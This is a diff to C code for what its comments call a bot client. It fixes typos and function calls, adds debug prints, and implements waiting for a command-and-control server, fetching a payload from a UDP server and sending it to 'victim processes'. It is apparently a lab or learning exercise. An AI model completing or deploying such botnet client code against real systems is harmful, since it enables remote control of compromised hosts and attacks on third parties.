@@ -8,6 +8,7 @@
 #include <netdb.h>
 #include <netinet/in.h>
 #include <sys/time.h>
+#include <err.h>
 
 #define MESSAGE_MAXLEN 512
 #define PORTLEN 22
@@ -59,6 +60,8 @@ void prog(struct msg *message, char *payload){
 	// ip address and port number of the UDP_server
 	char *udp_server_ip = message->entries[0].ip;
 	char *udp_server_port = message->entries[0].port;
+	
+	printf("%s %s\n", udp_server_ip, udp_server_port);
 
 	struct addrinfo *udp_server;
 	struct addrinfo hints;
@@ -82,6 +85,8 @@ void prog(struct msg *message, char *payload){
 
 	//sends "HELLO\n"
 	int bytes_sent = sendto(sock, data, sizeof(data), 0, udp_server->ai_addr, udp_server->ai_addrlen);
+	
+	printf("sent package to the udp_serv\n");
 
 	//waits for the UDP_server to send the payload
 	int bytes_recv = recvfrom(sock, payload, sizeof(payload), 0, NULL, NULL);
@@ -108,7 +113,7 @@ void run(struct msg *message, char *payload){
 	struct addrinfo hints;
 
 	memset(&hints, 0, sizeof(hints));
-	hits.ai_socktype = SOCK_DGRAM;
+	hints.ai_socktype = SOCK_DGRAM;
 
 	int sock;
 	sock = socket(PF_INET, SOCK_DGRAM, 0);
@@ -187,22 +192,20 @@ int main(int argc, char **argv){
 	parse_packet(&message, packet, bytes_recv);
 
 	if(message.command == '0'){
-		prog();
+		prog(&message, payload);
 	}
 
-	//WORK IN PROGRESS
-	/*
-		TODO wait for the C&C server to send RUN command
-		and ip addresses and ports of the victim processes
-		to which the payload is going to be sent
+	/* wait for the C&C server to send RUN command
+	 * and ip addresses and ports of the victim processes
+	 * to which the payload is going to be sent
 	*/
 
-	int bytes_recv = recvfrom(sock, packet, sizeof(packet), 0, NULL, NULL);
+	bytes_recv = recvfrom(sock, packet, sizeof(packet), 0, NULL, NULL);
 
 	parse_packet(&message, packet, bytes_recv);
 
 	if(message.command == '1'){
-		run();
+		run(&message, payload);
 	}
 
 
